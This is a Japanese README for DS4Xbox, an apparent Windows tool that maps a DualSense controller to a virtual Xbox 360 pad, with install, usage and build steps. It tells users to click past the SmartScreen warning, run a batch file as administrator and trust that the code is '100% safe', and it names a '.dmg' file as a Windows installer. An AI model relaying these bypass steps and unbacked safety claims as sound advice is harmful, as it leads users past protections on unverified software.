# 🎮 DS4Xbox

<p align="center">
  <img src="https://img.shields.io/badge/C%23-.NET%208.0%20LTS-blueviolet?style=for-the-badge&logo=csharp" alt="C# .NET 8.0 LTS" />
  <img src="https://img.shields.io/badge/Zero--Dependencies-100%25--Auditable-success?style=for-the-badge&logo=shield" alt="Zero Dependencies" />
  <img src="https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-blue?style=for-the-badge&logo=windows" alt="Platform: Windows" />
  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License: MIT" />
</p>

<p align="center">
  <a href="https://github.com/jtkjp06/ds4xbox/raw/main/ds4xbox_release.zip">
    <img src="https://img.shields.io/badge/📥_DOWNLOAD-ds4xbox__release.zip-brightgreen?style=for-the-badge&logo=github&logoColor=white" alt="Download Stable Release" height="65" />
  </a>
  <br />
  <strong>👉 【超かんたん】ここをクリックするだけで、最新の本体パッケージ（ZIP）を直接ダウンロードできます！</strong>
</p>

---

## 🌟 概要

**DS4Xbox** は、PS5コントローラー（**DualSense**）を Windows 上で **Xbox 360 コントローラーとして仮想認識させる** 超軽量かつ安全なマッピングツールです。

Xbox Game Pass（Forza Horizon 6、モンスターハンターなど）やEA Playなどの **XInput専用ゲーム** で、DualSenseを無線（Bluetooth）でスムーズに利用可能にします。

### 🛡️ 本プロジェクトの存在意義（既存ツールのリスク排除）

現在、多くのDualSense変換ツールには深刻なリスクが潜んでいます：
* **DS4Windows**: 公式開発リポジトリが消失。マルウェアを仕込んだ偽サイトやフェイクフォークが乱立しており、ダウンロードは極めて危険です。
* **DualSenseX (DSX)**: 強制DRM導入、Steam常駐必須化、頻繁な動作フリーズや認証エラーが多発。
* **一般的な野良ツール**: 開発者の出所が不明で、サプライチェーン攻撃（マルウェア埋め込み）の標的になりやすい状況。

**DS4Xbox は、NuGet等の外部パッケージ依存関係を「完全ゼロ (0%)」に抑え、100%自前で監査・ソースビルド可能なC#コードとして設計されています。** 不要な通信やアドウェア、サブスクリプションは一切ありません。永続的に無料で安全にご利用いただけます。

---

## ✨ 「できること」と「できないこと」

導入前に本ツールで対応している機能をご確認ください。

### 🟢 できること（強み）
* **無線（Bluetooth）で超低遅延プレイ**: Windows 標準 Bluetooth 経由でのリアルタイム・スムーズな変換。
* **XInput 専用ゲームへの完全対応**: Xbox Game Pass などのゲームで、DualSenseのボタン、アナログスティック、L2/R2トリガーをXbox 360コントローラーとして完全再現。
* **二重入力（チャタリング）の完全防止**: ドライバ（HidHide）と連動し、物理DualSenseをゲームから隠蔽することで「2つのコントローラーとして認識されてしまう問題」を物理的に解決。
* **ワンクリックでON/OFF切り替え**: タスクトレイに常駐し、Steamなどの「ネイティブDualSense対応ゲーム」を遊ぶときはワンクリックで変換をOFFにして共存可能。
* **超軽量＆低負荷設計**: 実行ファイルのサイズはわずか **約218KB**。メモリ使用量も極小（数MB以下）で、ゲームのフレームレートに一切悪影響を与えません。

### 🔴 できないこと（制限事項）
* **モーションセンサー（ジャイロ）のXboxへのマッピング**: ジャイロでのエイム操作等には非対応です。
* **アダプティブトリガー（抵抗変化）のカスタム設定**: トリガーの重さを細かく変える機能はありません（トリガーは純粋な高精度アナログ入力としてスムーズに動作します）。
* **コントローラー側イヤホンジャックの音声出力**: Bluetooth接続の制限上、コントローラーに挿したヘッドセットからの音声出力はサポートされません（PC本体のイヤホン端子やUSBヘッドセットをご使用ください）。

---

## 🚀 初心者向け：超かんたんインストールガイド

開発環境を構築することなく、配布されているパッケージを使って最短で導入する手順です。

> [!TIP]
> **✨ ドライバ自動セットアップ機能を搭載！**
> 本ツールは、実行に必要な前提ドライバ（ViGEmBus / HidHide / Legacinator）の自動検知および自動セットアップ支援機能を内蔵しています。アプリの初回起動時、またはタスクトレイメニューからワンクリックで、公式リポジトリから安全なHTTPS通信で自動ダウンロード＆インストールが可能です（手動で各サイトから個別にダウンロードして回る必要はありません）。

### 📥 準備するもの（アプリ内から自動インストール可能）

Windowsが仮想コントローラーを生成し、物理コントローラーを隠蔽するために**カーネルレベルの公式ドライバ**が必須となります。これらは本アプリの起動時に自動で検知・インストールできますが、手動で行う場合の入手先は以下の通りです：

1. **ViGEmBus ドライバのインストール**
   * [公式 GitHub Releases](https://github.com/nefarius/ViGEmBus/releases) から最新の `ViGEmBus_Setup.msi` をダウンロードして実行します。
2. **Legacinator の実行（セキュリティ対策）**
   * [Legacinator Releases](https://github.com/nefarius/Legacinator/releases) からツールをダウンロードして実行し、ViGEmBusの古いアップデーター（失効ドメインにアクセスしようとするコンポーネント）を画面の指示に従って **「完全に削除（クリーン）」** します。
3. **HidHide ドライバのインストール**
   * [公式 GitHub Releases](https://github.com/nefarius/HidHide/releases) から最新の `HidHideMSI.dmg`（または `.msi`）をダウンロードして実行し、PCを再起動します。

---

### 🏃 導入手順

#### ステップ 1: 本ツールのダウンロード
* GitHubのリポジトリの **[Releases]** タブから、最新の `ds4xbox_release.zip` をダウンロードし、任意のフォルダに解凍します。

#### ステップ 2: コントローラーのペアリング
* コントローラーの **PSボタン** と **Createボタン（左上の3本線ボタン）** を同時に長押しし、ライトバーがピピピと点滅するまで待ちます（ペアリングモード）。
* PCの Windows 設定 ➔ `Bluetooth とその他のデバイス` ➔ `デバイスの追加` から **Wireless Controller** をペアリングします。

#### ステップ 3: 初回起動と自動隠蔽（二重入力防止）の設定
1. 解凍したフォルダ内にある **`start_gamepad.bat`** をダブルクリックして起動します。
   * *※初回起動時、青い警告画面（Windows SmartScreen）が表示される場合があります。本アプリは個人開発の完全オープンソースツールであり、高額な年間有料署名証明書を適用していないために表示されますが、中身は100%安全なコードです。**「詳細情報」をクリックし、出現した「実行」ボタン** をクリックして進めてください。*
   * *※また、管理者権限（UAC）の確認ダイアログが出ますので「はい」を選択してください。*
2. 画面の右下（タスクトレイ）に **グレーの丸型アイコン** が表示されることを確認します。
3. Windowsのスタートメニューから **「HidHide Configuration Client」** を起動します。
   * **`Applications`** タブを開き、解凍したフォルダの中にある **`DS4Xbox.exe`** を一覧にドラッグ＆ドロップしてホワイトリストに追加します。
   * **`Devices`** タブを開き、一覧にある `Sony Wireless Controller` の左側にある **「鍵マーク」** にチェックを入れ、下部の **`Enable cloak`** にチェックを入れます。
   * 設定クライアントを閉じます。

---

## 🎮 使い方

非常にシンプルです。タスクトレイのアイコンから操作します。

* **変換を開始する**:
  * タスクトレイのアイコンを右クリックし、**「変換 ON」** を選択します（ダブルクリックでも可）。
  * アイコンが **緑色の丸型** に変化します。
  * この状態でゲームを起動すれば、自動的に「Xbox 360コントローラー」として快適にプレイできます。
* **一時的にOFFにする（Steam等のゲームでDualSense機能を使いたいとき）**:
  * トレイアイコンを右クリックし、**「変換 OFF」** にします。
  * アイコンが **グレー** に戻り、物理DualSenseが通常通りPCに直接認識されるようになります。
* **常時ONにしたい場合**:
  * **「起動時に自動ON」** にチェックを入れておくと、次回以降バッチファイルを起動した瞬間から自動で変換がONになります。

> [!TIP]
> **PC起動時に自動で常駐させたい場合**
> `Win + R` キーを押し、`shell:startup` と入力して実行します。開いたスタートアップフォルダの中に、`start_gamepad.bat` のショートカットを配置しておくだけで、PC起動時に自動的にタスクトレイに常駐するようになります。

---

## 🛠 開発者向け：ビルド手順（ソースからビルドしたい場合）

自分でソースコードをビルドしたいエンジニア・パワーユーザー向けの手順です。

### 前提環境
* **[.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0)** がインストールされていること。

### ビルドと実行
```powershell
# 1. ワークスペースに移動
cd E:\workspace\ds4xbox

# 2. リリース構成でビルド
dotnet build -c Release

# 3. 配布用パッケージ（単一ファイル化）の出力
dotnet publish -c Release -r win-x64 --self-contained false -p:PublishSingleFile=true -p:PublishReadyToRun=true
```

---

## 📄 ライセンス

本プロジェクトは **MIT ライセンス** の下で公開されています。

* **ViGEmBus ドライバ**: MIT ライセンス
* **HidHide ドライバ**: GPLv3 ライセンス
* **DS4Xbox ユーザーモードソースコード**: MIT ライセンス

---

## 📚 関連ドキュメント
* 💡 [技術仕様書（HID/IOCTL等のマッピングデータ）](docs/SPECIFICATION.md)
* ⚙️ [実装詳細仕様書（P/Invoke、スレッド設計など）](docs/IMPLEMENTATION.md)
